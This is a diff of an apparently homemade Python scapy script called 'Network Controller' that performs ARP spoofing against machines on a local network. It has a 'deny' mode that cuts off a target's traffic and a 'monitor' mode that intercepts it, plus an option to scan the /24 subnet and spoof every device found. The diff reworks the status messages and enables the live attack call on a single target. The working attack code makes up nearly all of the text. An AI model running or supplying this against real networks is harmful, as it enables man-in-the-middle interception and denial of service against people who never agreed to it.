@@ -69,7 +69,6 @@ def scan_network(ip, timeout=2):
     arp_broadcast = broadcast / arp_req
     # arp_broadcast.show()
     answered = scapy.srp(arp_broadcast, timeout=timeout, verbose=False)[0]
-    print("[+] Found " + str(len(answered)) + " devices")
     return answered
 
 
@@ -81,45 +80,39 @@ def start_attack(target_ip, gateway_ip):
         while True:
             spoof_arp_table(target_ip, target_mac, gateway_ip)
             spoof_arp_table(gateway_ip, gateway_mac, target_ip)
-            count += 2
-            print("\r[+] Packets sent: " + str(count), end="")
+            count += 1
+            print("\r[+]" + " Traffic of "+ option.target_ip + " has been "+(" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
             time.sleep(1)
 
     except KeyboardInterrupt:
-        print("[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
+        print("\n[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
         restore_arp_table(target_ip, target_mac, gateway_ip, gateway_mac)
         restore_arp_table(gateway_ip, gateway_mac, target_ip, target_mac)
         print("[+] ARP Tables Reset Successfully")
 
 
 option = get_arguments()
-
 print("\n[+][+]\t\tWelcome to Network Controller\t\t[+][+]\n")
 if option.mode == 'd':
     print("[+] Starting ARP Spoofing Attack in Deny Mode")
 else:
     print("[+] Starting ARP Spoofing Attack in Monitor Mode")
 
-try:
-    if option.all:
-        print("[+] Spoofing all devices in the network")
-        print("[+] Scanning network for devices")
-        res = scan_network(option.gateway_ip + "/24", option.timeout)
-        print(str(res))
-        # for i in res:
-        #     print("[+] Spoofing " + i[1].psrc)
-            # start_attack(i[1].psrc, option.gateway_ip)
+if option.all:
+    print("[+] Spoofing all devices in the network")
+    print("[+] Scanning network for devices")
+    res = scan_network(option.gateway_ip + "/24", option.timeout)
+    print("[+] Found " + str(len(res)) + " devices")
+    for i in res:
+        print("[+] Spoofing " + i[1].psrc)
+        # start_attack(i[1].psrc, option.gateway_ip)
 
-    elif option.list_ip:
-        print("[+] Spoofing devices " + str(option.list_ip))
-        for i in option.list_ip:
-            pass
-            # start_attack(i, option.gateway_ip)
-
-    else:
+elif option.list_ip:
+    print("[+] Spoofing devices " + str(option.list_ip))
+    for i in option.list_ip:
         pass
-        # start_attack(option.target_ip, option.gateway_ip)
+        # start_attack(i, option.gateway_ip)
 
-except:
-    print("[-] An error occurred. Exiting.")
-    sys.exit(1)
+else:
+    pass
+    start_attack(option.target_ip, option.gateway_ip)
